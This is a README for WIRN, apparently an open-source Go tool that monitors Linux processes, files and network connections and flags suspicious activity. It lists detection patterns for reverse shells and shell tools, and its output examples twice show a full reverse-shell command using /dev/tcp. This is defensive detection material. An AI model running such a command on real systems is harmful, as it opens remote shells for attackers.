# WIRN - Watch Inspect Report Notify

![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)
![Go Version](https://img.shields.io/badge/go-1.21+-00ADD8.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

**Production-ready Linux process monitoring and security detection tool**

```
██╗    ██╗██╗██████╗ ███╗   ██╗
██║    ██║██║██╔══██╗████╗  ██║
██║ █╗ ██║██║██████╔╝██╔██╗ ██║
██║███╗██║██║██╔══██╗██║╚██╗██║
╚███╔███╔╝██║██║  ██║██║ ╚████║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
```

## 🚀 Features

- **Real-time Process Monitoring**: Tracks new processes with PID, PPID, user, command, and working directory
- **Suspicious Activity Detection**: Identifies reverse shells, privilege escalation, and malicious patterns
- **File System Monitoring**: Uses `inotify` for efficient real-time file change detection
- **Network Monitoring**: Tracks TCP connections with detailed endpoint information
- **Production Ready**: Thread-safe with graceful shutdown, structured logging, and memory-efficient caching
- **Flexible Output**: JSON format support for SIEM integration
- **Advanced Filtering**: Filter by user, command pattern, or suspicious activity only

## 📋 Requirements

- Linux OS (kernel 2.6.13+)
- Go 1.21 or higher
- Root privileges (required for `/proc` access)

## 🔧 Installation

### Quick Install

```bash
# Clone repository
git clone https://github.com/Lokidres/WIRN.git
cd WIRN

# Install dependencies and build
make deps
make build

# Install system-wide
sudo make install
```

### From Source

```bash
go mod download
go build -o wirn .
sudo mv wirn /usr/local/bin/
```

## 📖 Usage

### Basic Usage

```bash
# Monitor processes only (default)
sudo wirn

# Monitor everything
sudo wirn -proc -file -net

# Show only suspicious activity
sudo wirn -suspicious

# JSON output to file
sudo wirn -json -output events.log
```

### Advanced Options

```bash
# Filter by specific user
sudo wirn -user www-data

# Filter by command pattern
sudo wirn -cmd "python.*"

# Custom watch directories
sudo wirn -file -watchdirs "/var/log,/home,/tmp"

# Debug mode with all features
sudo wirn -proc -file -net -env -loglevel debug

# Limit event capture
sudo wirn -max 1000

# Faster scanning (minimum 500ms recommended)
sudo wirn -interval 500
```

## 🎯 Command Line Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-proc` | `true` | Enable process monitoring |
| `-file` | `false` | Enable file system monitoring |
| `-net` | `false` | Enable network monitoring |
| `-interval` | `1000` | Scan interval in milliseconds (min: 500) |
| `-json` | `false` | Output in JSON format |
| `-output` | `""` | Write output to file |
| `-user` | `""` | Filter by username |
| `-cmd` | `""` | Filter by command regex pattern |
| `-suspicious` | `false` | Show only suspicious activities |
| `-env` | `false` | Include environment variables |
| `-max` | `0` | Maximum events to capture (0 = unlimited) |
| `-watchdirs` | `/tmp,...` | Comma-separated directories to watch |
| `-loglevel` | `info` | Log level (debug, info, warn, error) |
| `-quiet` | `false` | Quiet mode - no banner |

## 🔍 Suspicious Activity Detection

WIRN automatically detects common attack patterns including:

- Reverse shells (`nc`, `netcat`, `/dev/tcp`)
- Interactive shells (`bash -i`, `sh -i`)
- Code execution (`python -c`, `perl -e`, `ruby -e`)
- Suspicious downloads (`wget`, `curl`)
- Encoding tricks (`base64 -d`)
- Permission changes (`chmod +x`, `chmod 777`)
- Temporary file abuse (`/tmp/`, `/var/tmp/`, `/dev/shm/`)
- Privilege escalation (`sudo`, `su`, `passwd`)
- Persistence mechanisms (`crontab`, `systemctl`)

## 📊 Output Examples

### Standard Output

```
[2024-01-15 10:23:45] PID: 12345 | PPID: 1234 | User: attacker
  ↳ CMD: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  ↳ CWD: /tmp
  ⚠ SUSPICIOUS ACTIVITY DETECTED!
```

### JSON Output

```json
{
  "timestamp": "2024-01-15T10:23:45Z",
  "pid": 12345,
  "ppid": 1234,
  "user": "attacker",
  "command": "bash",
  "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
  "cwd": "/tmp",
  "suspicious": true
}
```

## 🏗️ Development

### Build System

```bash
# Show all available commands
make help

# Build
make build

# Run tests
make test

# Run linters
make lint

# Format code
make fmt

# Development mode (all monitors + debug)
make dev

# Cross-compile for multiple platforms
make cross-compile

# Create release packages
make release
```

### Project Structure

```
WIRN/
├── main.go           # Main application code
├── go.mod            # Go module dependencies
├── Makefile          # Build automation
├── README.md         # This file
├── Dockerfile        # Container build (optional)
└── build/            # Build artifacts (created by make)
```

## 🐳 Docker Support

```bash
# Build Docker image
make docker-build

# Run in container (requires privileged mode)
docker run --privileged --pid=host wirn:latest

# Or use GitHub Container Registry (if published)
docker pull ghcr.io/lokidres/wirn:latest
docker run --privileged --pid=host ghcr.io/lokidres/wirn:latest
```

## 🔐 Security Considerations

- **Root Required**: WIRN needs root privileges to access `/proc` filesystem
- **Performance Impact**: Continuous monitoring uses CPU/memory resources
- **Log Rotation**: Implement log rotation for long-running deployments
- **Network Security**: Network monitoring shows all connections (filter as needed)

## 📈 Performance

Version 2.0.0 improvements:
- ✅ Fixed race conditions with proper mutex usage
- ✅ LRU cache with TTL prevents memory leaks (10K entries, 5min TTL)
- ✅ Efficient `inotify`-based file monitoring (vs polling)
- ✅ Atomic operations for thread-safe counters
- ✅ Graceful shutdown with context cancellation
- ✅ Minimum interval protection (500ms)

## 🐛 Troubleshooting

### "Permission denied" errors

```bash
# Ensure running with sudo
sudo wirn
```

### High CPU usage

```bash
# Increase interval (default is now 1000ms)
sudo wirn -interval 2000
```

### Memory concerns

```bash
# Limit maximum events
sudo wirn -max 10000
```

## 📝 Changelog

### v2.0.0 (Production Ready)
- ✅ Fixed all race conditions
- ✅ Implemented LRU cache with TTL
- ✅ Migrated from deprecated `ioutil` to `os`
- ✅ Added `fsnotify` for efficient file monitoring
- ✅ Implemented graceful shutdown with context
- ✅ Added structured logging with logrus
- ✅ Fixed network address parsing (hex to IP)
- ✅ Added privilege checks
- ✅ Atomic operations for event counting
- ✅ Improved error handling throughout
- ✅ Added comprehensive Makefile

### v1.0.0 (Initial Release)
- Basic process, file, and network monitoring
- Suspicious activity detection
- JSON output support

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes with tests
4. Run `make lint` and `make test`
5. Submit a pull request

## 📄 License

MIT License - see LICENSE file for details

## 🙏 Acknowledgments

- Built with Go and love ❤️
- Uses `fsnotify` for efficient file monitoring
- Uses `logrus` for structured logging
- Uses `golang-lru` for memory-efficient caching

## 📧 Contact

- GitHub: [@Lokidres](https://github.com/Lokidres)
- Issues: [github.com/Lokidres/WIRN/issues](https://github.com/Lokidres/WIRN/issues)

---

**⚠️ Disclaimer**: This tool is for legitimate security monitoring only. Users are responsible for compliance with applicable laws and regulations.
